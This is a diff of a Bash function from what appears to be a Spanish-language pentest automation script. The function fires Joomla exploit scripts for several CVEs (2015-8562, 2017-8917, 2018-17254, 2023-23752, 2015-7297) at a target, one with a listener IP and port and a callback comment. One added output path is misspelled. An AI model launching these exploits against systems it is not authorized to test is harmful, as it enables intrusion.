@@ -1221,11 +1221,11 @@ function enumeracionCMS () {
 
 			echo "juumla.sh -u "$proto_http"://"$host":"$port""$path_web" " > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CMSDesactualizado.txt
 			juumla.sh -u "$proto_http"://$host:$port/ >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CMSDesactualizado.txt 2>/dev/null &
-			joomlaCVE-2023-23752.py "$proto_http"://"$host":"$port""$path_web" > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_joomla-CVE~2023~23752.txt
-			joomblah-CVE-2017-8917.py "$proto_http"://"$host":"$port""$path_web" > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_joomla-CVE~2017~8917.txt
+			joomla-cve2017-8917.py "$proto_http"://"$host":"$port""$path_web" > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_joomla-CVE~2017~8917.txt
 			joomlaPlugin-CVE-2018-17254.php -u "$proto_http"://"$host":"$port""$path_web"plugins/ > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_joomla-CVE~2018~17254.txt
-			joomla-cve-2015-8562.py -t "$proto_http"://"$host":"$port""$path_web" -l 8.8.8.8 -p 443 # request to https://app.beeceptor.com/
-			joomlaCVE-2023-23752.rb "$proto_http"://"$host":"$port""$path_web" --no-color > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_joomla-CVE-2023-23752.txt
+			joomla-cve2015-8562.py -t "$proto_http"://"$host":"$port""$path_web" -l 8.8.8.8 -p 443 # request to https://app.beeceptor.com/
+			joomla-cve2023-23752.rb "$proto_http"://"$host":"$port""$path_web" --no-color > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_joomla-CVE~2023~23752.txt
+			joomla-cve2015-7297.sh -u "$proto_http"://"$host":"$port""$path_web" > ogs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_joomla-CVE~2015~7297.txt
 			
 
 			#joomla-cd.rb "$proto_http://$host" > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_joomla-joomla-CVE~2023~23752.txt &
